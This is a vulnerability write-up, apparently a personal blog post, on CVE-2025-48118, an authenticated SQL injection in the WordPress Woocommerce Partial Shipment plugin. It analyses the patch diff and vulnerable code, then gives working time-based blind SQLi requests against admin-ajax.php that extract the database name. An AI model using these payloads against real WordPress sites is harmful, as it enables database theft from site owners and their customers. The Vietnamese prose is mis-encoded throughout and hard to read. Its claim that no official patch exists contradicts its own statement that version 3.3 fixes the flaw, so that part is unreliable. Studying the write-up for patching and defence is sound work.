# CVE-2025-48118 Analysis & POC


<!--more-->

Lá»— há»•ng xáº£y ra trÃªn plugin **Woocommerce Partial Shipment** cá»§a WordPress trÆ°á»›c phiÃªn báº£n **3.3**. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.

* **CVE ID**: [CVE-2025-48118](https://www.cve.org/CVERecord?id=CVE-2025-48118)
* **Product**: [WordPress Woocommerce Partial Shipment Plugin](https://wordpress.org/plugins/wc-partial-shipment/advanced/)
* **Vulnerability Type**: SQL Injection
* **Affected Versions**: <= 3.2
* **CVSS severity**:  High (8.5)
* **Required Privilege**: Subscriber

## Requirements

* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
- **Woocommerce Partial Shipment**:  v3.2(vul) vÃ  v3.3(fix)
- **diff tool**: **meld** hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version
- **Actived WooCommerce plugin**: plugin báº¯t buá»™c **actived** trÆ°á»›c khi cÃ i **Woocommerce Partial Shipment Plugin**, má»™t sá»‘ hÃ m trong **WooCommerce** sáº½ Ä‘Æ°á»£c sá»­ dá»¥ng.

## Analysis

NguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« **POST** request vÃ o SQL query mÃ  khÃ´ng cÃ³ cÆ¡ cháº¿ kiá»ƒm soÃ¡t cháº·t cháº½.

### Patch Diff

DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡.
CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file **wc-partial-shipment/woocommerce-partial-shipment.php**

NhÆ°ng á»Ÿ Ä‘Ã¢y, dev thay Ä‘á»•i khÃ¡ nhiá»u ta khÃ³ Ä‘á»ƒ tÃ¬m Ä‘Æ°á»£c vá»‹ trÃ­ lá»—i.

> Trong WordPress, Ä‘á»ƒ SQLi xáº£y ra, á»©ng dá»¥ng pháº£i tÆ°Æ¡ng tÃ¡c vá»›i database thÃ´ng qua biáº¿n global `$wpdb`, ta search tá»« khÃ³a nÃ y trong file **wc-partial-shipment/woocommerce-partial-shipment.php** Ä‘á»ƒ tÃ¬m sink.

{{< figure src="search_sink.png" caption="Káº¿t quáº£ tÃ¬m vá»‹ trÃ­ sink trong mÃ£ nguá»“n" alt="search sink" >}}

`get_shipment_id` vÃ  `get_wxp_shipment_data` lÃ  2 hÃ m thuá»™c class **WXP_Partial_Shipment** Ä‘Ã¡ng chÃº Ã½, dá»¯ liá»‡u Ä‘Æ°á»£c Ä‘Æ°a tháº³ng vÃ o cÃ¢u query mÃ  khÃ´ng cÃ³ cÆ¡ cháº¿ kiá»ƒm soÃ¡t nÃ o. Do Ä‘Ã³, lá»— há»•ng SQLi cÃ³ thá»ƒ xáº£y ra.

{{< figure src="patch.png" caption="So sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡" alt="Patch" >}}

Báº£n vÃ¡ sá»­ dá»¥ng `$wpdb->prepare()` Ä‘á»ƒ chuáº©n bá»‹ cÃ¢u query, thay vÃ¬ **ná»‘i trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng**. Äiá»u nÃ y Ä‘áº£m báº£o ráº±ng táº¥t cáº£ giÃ¡ trá»‹ Ä‘Æ°á»£c **escape Ä‘Ãºng cÃ¡ch** trÆ°á»›c khi chÃ¨n vÃ o SQL, ngÄƒn ngá»«a nguy cÆ¡ SQL Injection.

### How it work?

`get_shipment_id` vÃ  `get_wxp_shipment_data` Ä‘á»u Ä‘Æ°á»£c hÃ m `wxp_order_set_shipped` trong cÃ¹ng class gá»i vÃ  sá»­ dá»¥ng.

```php
function wxp_order_set_shipped(){
    $order_id = isset($_POST['order_id']) ? $_POST['order_id'] : 0;
    // other logic

    $wxp_shipment = $this->get_wxp_shipment_data($order_id);
    if(isset($_POST['order_id']) && $_POST['order_id']){
        global $wpdb;
        $shipment_id = $this->get_shipment_id($_POST['order_id']);
        if(!$shipment_id){
            $data = array(
                'order_id' =>$order_id,
                'shipment_id' =>1,
                'shipment_url'=>'',
                'shipment_num'=>'',
                'shipment_date'=>current_time('timestamp',0),
            );
            $wpdb->insert($wpdb->prefix."partial_shipment",$data,array('%d','%d','%s','%s','%s'));
            $shipment_id = $wpdb->insert_id;
        }
    // other logic     
    }

    echo json_encode(array('order_id'=>$order_id,'status'=>$status_key));
    exit();
}
```

ğŸ‘‰ `order_id` Ä‘Æ°á»£c láº¥y tá»« **POST request**, nÆ¡i ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ kiá»ƒm soÃ¡t lÃ m Ä‘á»‘i sá»‘ khi gá»i hÃ m `get_shipment_id` vÃ  `get_wxp_shipment_data`
truyá»n vÃ o cÃ¢u query chá»©a lá»• há»—ng SQLi.

Äá»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i `wxp_order_set_shipped` Ä‘Æ°á»£c gá»i vÃ  sá»­ dá»¥ng, ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a `wxp_order_set_shipped` trong thÆ° má»¥c chá»©a plugin.

{{< figure src="search_1.png" caption="TÃ¬m vá»‹ trÃ­ nÆ¡i hÃ m wxp_order_set_shipped Ä‘Æ°á»£c gá»i" alt="Search 1" >}}

`wxp_order_set_shipped` Ä‘Æ°á»£c `construct` cá»§a cÃ¹ng class sá»­ dá»¥ng lÃ m callback cho hook `wp_ajax_wxp_order_set_shipped` => yÃªu cáº§u ngÆ°á»i dÃ¹ng pháº£i Ä‘Äƒng nháº­p

ğŸ‘‰ Khi truy cáº­p vÃ o `/wp-admin/admin-ajax.php` vá»›i tham sá»‘:

```
action=wxp_order_set_shipped&order_id=payload_here
```

* Callback `wxp_order_set_shipped` Ä‘Æ°á»£c gá»i
* `order_id` Ä‘Æ°á»£c láº¥y trá»±c tiáº¿p tá»« request vÃ  chÃ¨n vÃ o SQL query.
* Query thá»±c thi 2 láº§n do Ä‘Æ°á»£c truyá»n vÃ o 2 hÃ m cháº¡y lá»‡nh SQL vá»›i payload Ä‘á»™c háº¡i.

## Exploit

### Detect SQLi

Gá»­i **POST request** chá»©a payload SQLi.

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
...
Cookie: cookie_here

action=wxp_order_set_shipped&order_id=(SELECT 1 FROM (SELECT SLEEP(5))a)
```

Khi Ä‘Ã³ cÃ¢u query sáº½ trá»Ÿ thÃ nh:

```sql
SELECT id as ship_id FROM wp_partial_shipment WHERE order_id=(SELECT 1 FROM (SELECT SLEEP(5))a)
```

á» Ä‘Ã¢y cÃ³ 2 nÆ¡i thá»±c hiá»‡n query nÃªn thá»i gian pháº£n há»“i sáº½ tÄƒng gáº¥p Ä‘Ã´i

{{< figure src="time_resp.png" caption="Káº¿t quáº£ pháº£n há»“i khi khai thÃ¡c thÃ nh cÃ´ng" alt="time response" >}}

Ta sá»­ dá»¥ng **subquery trong má»‡nh Ä‘á» FROM** vÃ¬ truy váº¥n con Ä‘Æ°á»£c coi nhÆ° má»™t báº£ng táº¡m thá»i. MySQL sáº½ thá»±c thi truy váº¥n con trÆ°á»›c Ä‘á»ƒ táº¡o báº£ng táº¡m, sau Ä‘Ã³ má»›i thá»±c hiá»‡n truy váº¥n chÃ­nh. Khi so sÃ¡nh theo tá»«ng row, `SLEEP` chá»‰ cháº¡y má»™t láº§n trong quÃ¡ trÃ¬nh khá»Ÿi táº¡o báº£ng táº¡m, cÃ¡c láº§n so sÃ¡nh tiáº¿p theo sáº½ khÃ´ng thá»±c thi láº¡i, nhá» Ä‘Ã³ trÃ¡nh viá»‡c `SLEEP` bá»‹ nhÃ¢n nhiá»u láº§n.

VÃ­ dá»¥ khi gá»­i request vá»›i payload nÃ y:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
...
Cookie: cookie_here

action=wxp_order_set_shipped&order_id=(SELECT SLEEP(5))
```

Thá»i gian tráº£ vá» tÄƒng theo cáº¥p sá»‘ nhÃ¢n

{{< figure src="search_2.png" caption="Thá»i gian pháº£n há»“i tÄƒng theo cáº¥p sá»‘ nhÃ¢n" alt="search 2" >}}

### Get First Letter of Database Name

Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ **dump Ä‘Æ°á»£c háº¿t data** lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ gáº§n nhÆ° toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.

Gá»­i request vá»›i **SQLi payload**:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
...
Cookie: cookie_here

action=wxp_order_set_shipped&order_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a)
```

Sá»­ dá»¥ng `SUBSTRING()` Ä‘á»ƒ láº¥y kÃ½ tá»± Ä‘áº§u tiÃªn cá»§a **database name**, `IF()` tráº£ vá» `SLEEP(5)` náº¿u kÃ½ tá»± Ä‘Ã³ lÃ  `0x77`('w')

Sá»­ dá»¥ng hex encoding `w` thÃ nh `0x77` vÃ¬ `order_id` Ä‘Æ°á»£c láº¥y tá»« **POST** request trong nÃªn bá»‹ escape bá»Ÿi [magic quotes](https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes) trong WordPress vÃ  bá»Ÿi `sanitize_text_field`.

ğŸ‘‰ Dá»±a trÃªn thá»i gian pháº£n há»“i => kÃ­ tá»± Ä‘áº§u tiÃªn Ä‘Ãºng lÃ  `w`.

## Conclusion

Lá»— há»•ng **CVE-2025-48118** trong plugin WordPress **Woocommerce Partial Shipment** trÆ°á»›c phiÃªn báº£n **3.3**, xuáº¥t phÃ¡t tá»« viá»‡c truyá»n trá»±c tiáº¿p input tá»« ngÆ°á»i dÃ¹ng vÃ o SQL query mÃ  khÃ´ng cÃ³ biá»‡n phÃ¡p kiá»ƒm soÃ¡t cháº·t cháº½ dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.

ChÆ°a cÃ³ báº£n vÃ¡ chÃ­nh thá»±c nÃ o cho lá»— há»•ng nÃ y.

**Key takeaways**:

* Kiá»ƒm soÃ¡t ká»¹ input tá»« ngÆ°á»i dÃ¹ng.
* LuÃ´n sá»­ dá»¥ng `$wpdb->prepare()` khi lÃ m viá»‡c vá»›i database trong WordPress Ä‘á»ƒ trÃ¡nh SQL Injection.
* ThÆ°á»ng xuyÃªn cáº­p nháº­t plugin vÃ  kiá»ƒm tra báº£o máº­t Ä‘á»ƒ trÃ¡nh trá»Ÿ thÃ nh má»¥c tiÃªu táº¥n cÃ´ng.

## References

[SQL Injection cheat sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[WordPress Woocommerce Partial Shipment Plugin <= 3.2 is vulnerable to SQL Injection](https://patchstack.com/database/wordpress/plugin/wc-partial-shipment/vulnerability/wordpress-woocommerce-partial-shipment-3-2-sql-injection-vulnerability)


---

> TÃ¡c giáº£: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-09-29-cve-2025-48118/  

